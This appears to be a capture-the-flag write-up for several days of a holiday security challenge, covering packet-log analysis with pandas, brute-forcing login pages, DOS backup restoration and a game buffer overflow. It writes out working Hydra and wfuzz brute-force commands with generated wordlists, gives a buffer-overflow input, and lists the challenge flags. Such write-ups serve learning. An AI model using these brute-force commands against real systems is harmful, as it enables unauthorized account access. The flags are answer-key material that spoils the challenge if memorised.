## Day 2 Log Analysis
How many packets were captured (looking at the PacketNumber)?
Input: ``df.count()`` gives the packet number. Another way is to simply write ``df`` and the table printed will show the number of packets from start to finish.

Answer: ``100``  
What IP address sent the most amount of traffic during the packet capture?  
Input: Using the code ``df.groupby(['Source']).size()`` gives a list of ip addresses and the traffic they sent.

Answer: ``10.10.1.4``  
What was the most frequent protocol?

Answer: ``ICMP``  
## Day 3 Brute Forcing  
What is the flag?  
Input: Visiting the login page. Using the ``crunch 3 3 0123456789ABCDEF -o 3digits.txt`` command to create a file with all the possible passwords.  
![image](https://github.com/Azure9733/JTP23-WriteUps/assets/143328010/268b3ed7-250e-4f2d-b1fc-60ae0a894532)  
Viewing Page source of the login page to find the method, server URL and name of input value. ``Method=post`` Action="login.php" so login ``URL=http://(My MachineIP):8000/login.php`` and ``name="pin"``  
![image](https://github.com/Azure9733/JTP23-WriteUps/assets/143328010/a8b9143b-43c5-4709-bc80-2e910c93a46b)  
Now using Hydra ``hydra -l '' -P 3digits.txt -f -v 10.10.211.75 http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000`` I brute force the password(6F5).  
Answer: ``THM{pin-code-brute-force}``  
## Day 4 Brute Forcing  
What is the correct username and password combination?   
Input: Installed cewl via the terminal. Then visited ``http://(MachineIP)/login.php``  
Using ``cewl -d 2 -m 5 -w cewlpasswords.txt http://(MachineIP) --with-numbers`` i create a list of potential passwords  
Using ``cewl -d 0 -m 5 -w cewlusernames.txt http://(MachineIP)/team.php --lowercase`` I create a list of potential usernames  
![image](https://github.com/Azure9733/JTP23-WriteUps/assets/143328010/81ba3f61-3acf-430a-af93-9bb0246a5371)  
Now I brute force using `` wfuzz -c -z file,cewlusernames.txt -z file,cewlpasswords.txt --hs "Please enter the correct credentials" -u http://10.10.149.108/login.php -d "username=FUZZ&password=FUZ2Z"``

Answer:``THM{m3rrY4nt4rct1crAft$}``  
## Day 5 Reverse Engineering  
How large (in bytes) is the AC2023.BAK file?   
Input: After running the DOSBOX-X program. Simply running the ``DIR`` command give the information of all the files and directories in the current directory. From there the byte size of AC2023.BAK file is visible.  
![image](https://github.com/Azure9733/JTP23-WriteUps/assets/143328010/22067620-77c7-4956-bd80-10147df90e41)  
Answer ``12,704``  
What is the name of the backup program?  
Input: Navigating the to ``C:\TOOLS\BACKUP`` directory, I open the readme file via the ``TYPE``  command. The backup software is referred to as BackupMaster3000, which is the answer.  
![image](https://github.com/Azure9733/JTP23-WriteUps/assets/143328010/d44cddcb-cf9a-4783-ba9f-cee28ab3cbd6)  
Answer: ``BackupMaster3000``

Input: From the readme file, the correct bytes have been provided.  
![image](https://github.com/Azure9733/JTP23-WriteUps/assets/143328010/4cf9adfd-fa03-44de-80a2-d188d1e03e99)  
Answer: ``41 43``  
What is the flag after restoring the backup successfully?  
Answer: ``THM{0LD_5CH00L_C00L_d00D}``  
## Day 6 Memory corruption  
If the coins variable had the in-memory value in the image below, how many coins would you have in the game?  
Input: Using the tool (https://www.rapidtables.com/convert/number/hex-to-decimal.html) and inputting the Hexadecimal values in reverse order i get the answer.  
![image](https://github.com/Azure9733/JTP23-WriteUps/assets/143328010/b4f2ecb2-12d6-4336-b6f0-a310a6b3b300)  
Answer: ``1397772111``  
What is the value of the final flag?  
Input: Despite having the money to buy the flag, Mc Greedy has rigged the game such that the star will not be given even if it is bought. instead another item will be given which has a ASCII value of e. In order the get the star which has a ASCII value of d, I used buffer overflow by changing my name into one long enough such that the inventory gets the ASCII value of d. The length of such a name is 4*11 + 1 characters long. So i put 44 a's followed by a d. This gives me the star which upon giving to the christmas tree gives me the flag.
